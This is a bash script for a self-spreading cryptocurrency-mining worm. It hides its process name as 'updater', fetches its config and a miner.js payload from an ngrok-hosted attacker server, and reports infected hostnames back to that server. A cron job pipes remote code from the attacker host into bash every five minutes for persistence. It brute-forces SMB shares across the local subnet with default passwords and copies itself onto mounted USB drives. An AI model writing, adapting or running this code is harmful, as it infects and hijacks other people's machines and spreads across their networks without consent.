#!/bin/bash

# Disguise as a generic process
exec -a updater bash -c '
  # Colors for logging
  RED="\033[31m"
  PURPLE="\033[35m"
  GREEN="\033[32m"
  RESET="\033[0m"

  # Default Configuration
  ATTACKER_IP="3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app"
  ATTACKER_PORT="8080"
  CONFIG_URL="https://github.com/lifewithoutcodes/mining-scripts/releases/latest/download/config.txt"
  LOG_URL="http://${ATTACKER_IP}:${ATTACKER_PORT}/log_worker"
  RETRY_FILE="/tmp/retry_vulnerable.txt"
  NETWORK_RANGE="192.168.1."
  COMMON_USERS=("admin" "user" "guest")
  COMMON_PASSWORDS=("password" "123456" "admin")

  # Install dependencies
  install_deps() {
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Installing dependencies${RESET}"
    if ! command -v curl >/dev/null; then
      if command -v apt-get >/dev/null; then
        apt-get update -y && apt-get install -y curl
      elif command -v yum >/dev/null; then
        yum install -y curl
      elif command -v dnf >/dev/null; then
        dnf install -y curl
      else
        echo -e "${RED}[$(date +%H:%M:%S)] curl not found and no package manager available${RESET}"
        exit 1
      fi
    fi
    if ! command -v node >/dev/null; then
      curl -fsSL https://deb.nodesource.com/setup_16.x | bash - && apt-get install -y nodejs
    fi
    if ! command -v npm >/dev/null; then
      apt-get install -y npm
    fi
    if ! command -v smbclient >/dev/null; then
      apt-get install -y smbclient
    fi
    # Install Node.js packages for miner.js
    mkdir -p /tmp/miner_node_modules
    cd /tmp/miner_node_modules
    npm install axios ws chalk --save
    cd -
    echo -e "${GREEN}[$(date +%H:%M:%S)] Node.js packages installed${RESET}"
  }

  # Fetch and parse config
  fetch_config() {
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Fetching config from $CONFIG_URL${RESET}"
    curl -s "$CONFIG_URL" -o /tmp/config.txt
    if [ -f /tmp/config.txt ]; then
      while IFS= read -r line; do
        if [[ $line =~ ^CONFIG_UPDATE_URL=(.*)$ ]]; then
          CONFIG_UPDATE_URL="${BASH_REMATCH[1]}"
          echo -e "${PURPLE}[$(date +%H:%M:%S)] Updated CONFIG_UPDATE_URL to $CONFIG_UPDATE_URL${RESET}"
        elif [[ $line =~ ^POOL_URL=(.*)$ ]]; then
          POOL_URL="${BASH_REMATCH[1]}"
          echo -e "${PURPLE}[$(date +%H:%M:%S)] Updated POOL_URL to $POOL_URL${RESET}"
        elif [[ $line =~ ^WALLET_ADDRESS=(.*)$ ]]; then
          WALLET_ADDRESS="${BASH_REMATCH[1]}"
          echo -e "${PURPLE}[$(date +%H:%M:%S)] Updated WALLET_ADDRESS${RESET}"
        elif [[ $line =~ ^ATTACKER_IP=(.*)$ ]]; then
          ATTACKER_IP="${BASH_REMATCH[1]}"
          echo -e "${PURPLE}[$(date +%H:%M:%S)] Updated ATTACKER_IP to $ATTACKER_IP${RESET}"
        elif [[ $line =~ ^ATTACKER_PORT=(.*)$ ]]; then
          ATTACKER_PORT="${BASH_REMATCH[1]}"
          LOG_URL="http://${ATTACKER_IP}:${ATTACKER_PORT}/log_worker"
          echo -e "${PURPLE}[$(date +%H:%M:%S)] Updated ATTACKER_PORT to $ATTACKER_PORT${RESET}"
        fi
      done < /tmp/config.txt
    else
      echo -e "${RED}[$(date +%H:%M:%S)] Failed to fetch config${RESET}"
    fi
  }

  # Download and run miner
  run_miner() {
    MINER_URL="http://$ATTACKER_IP:$ATTACKER_PORT/miner.js"
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Fetching miner from $MINER_URL${RESET}"
    curl -s "$MINER_URL" -o /tmp/miner.js
    if [ -f /tmp/miner.js ]; then
      # Set environment variable for exploit-triggered execution
      export EXPLOIT_TRIGGERED="1"
      NODE_PATH=/tmp/miner_node_modules node /tmp/miner.js &
      MINER_PID=$!
      echo -e "${GREEN}[$(date +%H:%M:%S)] Miner started (PID: $MINER_PID)${RESET}"
      # Log exploit success
      curl -s -X POST -d "Exploit-triggered miner started on $(hostname):$MINER_PID" "$LOG_URL" >/dev/null
    else
      echo -e "${RED}[$(date +%H:%M:%S)] Failed to fetch miner.js${RESET}"
      exit 1
    fi
  }

  # Ensure persistence
  ensure_persistence() {
    CRON_JOB="*/5 * * * * curl -s http://$ATTACKER_IP:$ATTACKER_PORT/miner.sh | bash"
    if ! crontab -l 2>/dev/null | grep -q "$CRON_JOB"; then
      (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
      echo -e "${GREEN}[$(date +%H:%M:%S)] Cron persistence established${RESET}"
    fi
    # Integrity check for miner.sh
    if [ -f /tmp/miner.sh ]; then
      CURRENT_HASH=$(sha256sum /tmp/miner.sh | awk "{print \$1}")
      EXPECTED_HASH=$(curl -s "http://$ATTACKER_IP:$ATTACKER_PORT/miner.sh" | sha256sum | awk "{print \$1}")
      if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
        curl -s "http://$ATTACKER_IP:$ATTACKER_PORT/miner.sh" -o /tmp/miner.sh
        chmod +x /tmp/miner.sh
        echo -e "${PURPLE}[$(date +%H:%M:%S)] Restored miner.sh due to integrity mismatch${RESET}"
      fi
    fi
  }

  # LAN Worming via SMB
  smb_spread() {
    for i in $(seq 1 254); do
      target="${NETWORK_RANGE}${i}"
      for user in "${COMMON_USERS[@]}"; do
        for pass in "${COMMON_PASSWORDS[@]}"; do
          if smbclient -U "$user%$pass" -c "put $0 miner.sh" "//$target/C$" 2>/dev/null; then
            echo -e "${GREEN}[$(date +%H:%M:%S)] Copied to $target via SMB${RESET}"
          fi
        done
      done &
    done
  }

  # USB Injection
  usb_inject() {
    while true; do
      for dev in /dev/sd[b-z]1; do
        if [ -b "$dev" ]; then
          mountpoint=$(mount | grep "$dev" | awk "{print \$3}")
          if [ -n "$mountpoint" ]; then
            for file in miner.sh miner.js config.txt setup.sh; do
              if [ -f "/tmp/$file" ] && [ ! -f "$mountpoint/$file" ]; then
                cp "/tmp/$file" "$mountpoint/$file"
                chmod +x "$mountpoint/$file"
                echo -e "${GREEN}[$(date +%H:%M:%S)] Injected $file into USB at $mountpoint${RESET}"
              fi
            done
          fi
        fi
      done
      sleep 10
    done
  }

  # Watchdog
  watchdog() {
    while true; do
      if ! ps -p $MINER_PID >/dev/null 2>&1; then
        echo -e "${RED}[$(date +%H:%M:%S)] Miner stopped, restarting${RESET}"
        run_miner
      fi
      sleep 60
    done
  }

  # Main execution
  install_deps
  fetch_config
  ensure_persistence
  run_miner
  watchdog &
  smb_spread &
  usb_inject &

  wait
'